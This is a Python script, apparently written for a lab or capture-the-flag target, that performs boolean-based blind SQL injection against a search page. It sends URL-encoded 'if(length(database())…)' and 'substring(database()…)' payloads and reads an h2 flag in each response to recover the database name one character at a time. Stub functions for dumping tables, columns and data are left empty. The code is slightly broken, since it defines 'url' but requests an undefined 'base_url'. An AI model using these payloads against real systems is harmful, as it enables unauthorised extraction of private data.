import requests
import re
import json
from bs4 import BeautifulSoup

#---------------------------------------------------------------------------------------------------------

url = "http://vulnerable.com:13021/search/"

key_char = []

for ascii_value in range(32, 127):
    char = chr(ascii_value)
    key_char.append(char)

def database():

    dbs_len = []

    dbs_name = []

    for i in range(0, 1000):

        final_url = base_url + f"Yahoo'+and+1%3D(select+if(length(database())%3D{i}%2C+1%2C+0))%23"
        httppacket = requests.get(final_url).text
        soup = BeautifulSoup(httppacket, 'html.parser')
        h2_tags = soup.find_all('h2')
        h2_tags = str(h2_tags[0])
        
        find1 = []
        
        for x in h2_tags:
            find1.append(x)
        
        if find1[-6] == '1':
            dbs_len.append(i)
            break

    a = 1

    while dbs_len[0] >= a :
        
        for char in key_char:

            final_url = base_url + f"Yahoo%27+and+1%3D%28select+if%28substring%28database%28%29%2C{a}%2C1%29%3D%27{char}%27%2C+1%2C+0%29%29%23"
            httppacket = requests.get(final_url).text
            soup = BeautifulSoup(httppacket, 'html.parser')
            h2_tags = soup.find_all('h2')
            h2_tags = str(h2_tags[0])
            
            found = []
        
            for x in h2_tags:
                found.append(x)
            
            if found[-6] == '1':
                dbs_name.append(char.lower())
                print('found one: '+ char.lower())
                break

        a += 1

    database_name = ''.join(dbs_name)
    
    dbs = database_name

    print(dbs)

    return

def tables():
    return

def columns():
    return

def dumpdata():
    return

# database()





database()